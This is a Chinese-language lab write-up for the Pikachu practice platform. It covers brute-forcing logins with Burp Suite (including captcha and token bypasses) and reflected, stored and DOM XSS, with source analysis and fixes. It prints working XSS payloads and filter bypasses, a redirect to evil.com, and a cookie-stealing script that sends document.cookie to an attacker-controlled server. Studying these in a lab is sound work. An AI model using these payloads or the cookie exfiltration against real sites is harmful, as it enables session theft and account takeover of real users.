---

typora-copy-images-to: 图片
typora-root-url: ./
---

# 一、暴力破解

Burte Force（暴力破解）概述

​             “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。         

​             理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。这里的认证安全策略, 包括：

​              1.是否要求用户设置复杂的密码；
​             2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
​             3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
​             4.是否采用了双因素认证；
​             ...等等。

## 1、基于表单的暴力破解

a、提交数据

![1568213840918](/图片/1568213840918.png)

b、抓包进行爆破

![1568215095203](/图片/1568215095203.png)

![1568215114930](/图片/1568215114930.png)

c、看响应数据包长度

![1568215188316](/图片/1568215188316.png)

d、爆出密码为123456

![1568215234863](/图片/1568215234863.png)

## 2、验证码绕过(on server)

a、有些认证码机制造成浏览器提交数据后页面没刷新验证码就还在有效期中可以重复使用，使用bursuite拦截发送到repeater,多次发送请求相同的验证码果然可以重复使用。

![1568618135365](/图片/1568618135365.png)

b、使用发送到intruder添加paload进行爆破

![1568618273695](/图片/1568618273695.png)

![1568618313203](/图片/1568618313203.png)

3、爆破成功

![1568618412054](/图片/1568618412054.png)

## 3、验证码绕过(on client)

前端绕过是最不可靠的，使用bursuit抓包可以随意修改请求数据，绕过前端限制。

a、直接抓包，有了这个请求包后，验证码是可以不需要的

![1568618656858](/图片/1568618656858.png)

b、扔到intruder爆破：

![1568619024697](/图片/1568619024697.png)

![1568619012983](/图片/1568619012983.png)

c、爆出账户密码

![1568619093940](/图片/1568619093940.png)

## 4、token防爆破?

每次请求后token都是会改变的，这是否就意味着不可爆破？实际上我们是可以获取token的，把token加进paload进行密码爆破。

a、首先抓包扔到intruder，配置positions

![1568624869473](/图片/1568624869473.png)

b、点击Options,设置线程为1

![1568625168055](/图片/1568625168055.png)

添加Grep-Extract

![1568625201767](/图片/1568625201767.png)

指定token并复制下来，点击ok保存

![1568625270482](/图片/1568625270482.png)

![1568625405872](/图片/1568625405872.png)

redirections设置为always

![1568625419009](/图片/1568625419009.png)

c、接下来设置payloads

![1568625531546](/图片/1568625531546.png)

payload2为token,b把之前复制的token填入initial payload里面

![1568625574535](/图片/1568625574535.png)

d、开始爆破，爆破成功

![1568625717579](/图片/1568625717579.png)

# 二、Cross-Site Scripting

​		Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：
​         1.反射性XSS;
​          2.存储型XSS;
​          3.DOM型XSS;
​          XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
​            因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
​            输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
​            输出转义：根据输出点的位置对输出到前端的内容进行适当转义。
​          对于过滤，我们会通过各种方法去绕过:

​           前端过滤绕过：抓包拦截改包

​           大小写绕过：<ScipT>alert(/xss/)</SCipt>

​            双写绕过：<scr<script>ipt>alert(/xss/)</s</script>cript>

​            注释干扰：<sc<!--content-->ript>alert(/xss/)</scr<!--content-->ipt>

​            编码绕过：依据前端编码解码机制

## 1、反射型xss(get)



### 1）漏洞验证：

页面只有一个输入框并设置了长度限制，随便输入一个字符，并在页面上返回字符，在message参数直接提交payload:<script>alert(1)</script>。

![1568704670690](/图片/1568704670690.png)

其他一些有趣的payload:

<a href=""  onclick=alert("xss")>type<a>
<img src='' onerror=alert("xss")>

<script>window.location='http://1.1.1.1'</script＞
<script>document.location.href="http://www.evil.com"</script>
<iframe src="http://1.1.1.1/victim" height = "0" width = "0"></iframe>
<srcipt>new.Image.src="192.168.1.104/c.php?output="+document.cookie</script>
<script>document.body.innerHTML="<div stytle=visibility:visible;><h1>THIS WEBSITE IS UNDER ATTACK</h1>"</script>
### 2）漏洞利用

#### a、窃取cookie

首先你得有个服务器，在服务器根目录下新建一个a.js脚本：

var img = new Image()
img.src = "http://你的服务器ip/cookies.php?cookie="+document.cookie;

然后通过xss诱导受害者访问你这个a.js，paload为<script src="http://你的ip/a.js"></script>,如果被访问到，你就可以在服务日志获取到受害者的cookie。

![1569133272540](/图片/1569133272540.png)

![1569133321734](/图片/1569133321734.png)

### 3）代码分析

服务器获取用户通过get提交过来的message,没有过滤就通过字符串拼接赋值给html，并且没有做任何编码处理就打印出来。

![1568717795251](/../../../hacker%20book/blog/pikachu/%E5%9B%BE%E7%89%87/1568717795251.png)

![1568717963826](/../../../hacker%20book/blog/pikachu/%E5%9B%BE%E7%89%87/1568717963826.png)

### 4）代码修复

使用htmlspecialchars将特殊字符转换成html实体：

![1569134982192](/图片/1569134982192.png)

修复后再攻击发现无法实现弹框，并且paload被编码成html实体

![1569135036924](/图片/1569135036924.png)

![1569135164026](/图片/1569135164026.png)

## 2、反射型xss(post)

这里的反射型xss(post)跟get的都是一样的，只是请求方式不一样，所以也不废话那么多。

### 1）漏洞验证

这里要先登录

![1569136278832](/图片/1569136278832.png)

然后输入paloads，验证成功

![1569136374273](/图片/1569136374273.png)



## 3、存储型xss

​        攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。它一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

###       1）漏洞验证

直接在留言板上提交恶意代码发现，访问页面直接执行了恶意代码

![1569154820234](/图片/1569154820234.png)       

### 2）代码分析

不做任何过滤直接写入数据库

![1569225158281](/图片/1569225158281.png)

不做实体编码直接输出到前端页面上

![1569225377407](/图片/1569225377407.png)

### 3）代码修复

![1569225629901](/图片/1569225629901.png)

## 4、DOM型xss

DOM xss是基于dom文件对象模型的，前端脚本通过dom动态修改页面，由于不予服务端运行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。常见的可以操作的dom对象有：url、location、referrer等。dom型的xss比较特殊，是一种基于dom树的xss，服务器端经常使用document.body.innertHtml等动态函数生成HTML页面，如果这些函数在引用某些变量时没有进行过滤检查，就会产生dom型的xss。dom型的xss可能是存储型的也可能是反射性的。

### 1）漏洞验证

碰到一个输入框一般情况下，我会直接输入几个字符，然后查看源代码，查看出现在哪个地方

![1569228526687](/图片/1569228526687.png)

![1569228544012](/图片/1569228544012.png)

并没有发现输入的字符串，然后就考虑dom型的xss，提交输入的内容后有个what do you see,然后在源代码发现了这个![1569228933416](/图片/1569228933416.png)

输入的内容嵌入到a标签里面，我们闭合掉引号形成paload。

![1569229377388](/图片/1569229377388.png)

![1569229105926](/图片/1569229105926.png)

### 2）代码分析

DOM型的xss恶意代码没有经过服务器器，是直接经过js处理的。

![1569291505129](/图片/1569291505129.png)

### 3）代码修复

xss修复一般想到的是转义，转义一般比过滤更加可靠，在php中有现成的htmlspecialchars函数对字符串进行转义，而js似乎没有有现成的函数进行转义，尝试使用正则表达式编写一个转义函数实现转义。

![1569293570398](/图片/1569293570398.png)

## 5、DOM型xss-x

打开页面查看源代码，操作基本跟上节差不多

![1569294676460](/图片/1569294676460.png)

先输入paload：' onclick="alert(1)"，点击[有些费尽心机想要忘记的事情,后来真的就忘掉了]，再点击[就让往事都随风,都随风吧]

![1569294731611](/图片/1569294731611.png)

## 6、xss之盲打

如何称之盲打，是因为你无法在攻击页面确认是否攻击成功，从这页面中看是提交看法建议的页面，提交的数据很可能会在后台显示。

![1569295586317](/图片/1569295586317.png)

![1569295634384](/图片/1569295634384.png)

### 1）代码分析

不做任何过滤

![1569295747591](/图片/1569295747591.png)

不做任何转义的输出

![1569295952713](/图片/1569295952713.png)

## 7、xss之过滤

### 1）漏洞验证

正常输入<script>alert(1)</script>发现被过滤掉了，只剩一个'>',难道其他字符全被过滤掉了？尝试单输入<,发现又没有被吃掉，猜想过滤的不是特定字符，而是某些符合规则的字符串组合。尝试大小写绕过，<Script>alert(1)</Script>，发现攻击成功，后来我发下<img src="" onerror="alert(1)">这个 也是可以绕过的，这个过滤是搞笑的吧，看下源码。

![1569296673960](/图片/1569296673960.png)

### 2）源码分析

发现是一个简单的正则过滤，怪不得<img src="" onerror="alert(1)">直接可以 绕过。

![1569296855976](/图片/1569296855976.png)

## 8、xss之htmlspecialchars

之前以为转义是很安全的，现在发现转义后不一定会完全不存在xss漏洞，比如单引号没有被转义，在一定情况下是会存在xss漏洞的。

### 1）漏洞验证

这里使用单引号即可绕过转义：' onclick='alert(1)'

![1569304906691](/图片/1569304906691.png)

### 2）代码分析

这里html转义后字符串结合a标签输出到html页面上，这时利用单引号没有被转义实现攻击。加上ENT_QUOTES参数可以对单引号进行转义，htmlspecialchars($_GET['message'],ENT_QUOTES)

![1569305212126](/图片/1569305212126.png)

## 9、xss之href输出

### 1）漏洞验证

打开页面尝试攻击，发现特殊字符全部被转义，包括单引号，估计使用了htmlspecialchars($_GET['message'],ENT_QUOTES)。但看源代码发现输入内容被输出到a标签的herf属性中。意味着可以尝试伪协议绕过javascript:alert(1)。

![1569306640860](/图片/1569306640860.png)

### 2）代码分析

虽然做了彻底的转义，但输出在a标签的herf中，没有做协议的过滤。

![1569306728168](/图片/1569306728168.png)

### 3）代码修复

设置href只允许http,https协议。

![1569307505399](/图片/1569307505399.png)

## 10、xss之js输出

1）漏洞验证

打开页面输入数据，查看源代码，发现在js里面出现，然后构造正确的语法就可以实现攻击了，paload:  ';alert(1);$a='

![1569307889422](/图片/1569307889422.png)

2)代码分析

php获取message并赋值给jsvar，然后输出到页面的js中

![1569308314825](/图片/1569308314825.png)

![1569308028645](/图片/1569308028645.png)

3）代码修复

这里讲输入动态的生成到了js中,形成xss，javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义，这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。所以在JS的输出点应该使用\对特殊字符进行转义。

11、总结

对于xss的防范总的来说从两个方面来考虑，输入进行过滤和输出进行转义。

在这里只是介绍各种情况的xss和修复，并没有介绍很深各种过waf姿势，只有8和9有点意思，在之后完成这个教程会单独把xss拿出来研究各种绕过。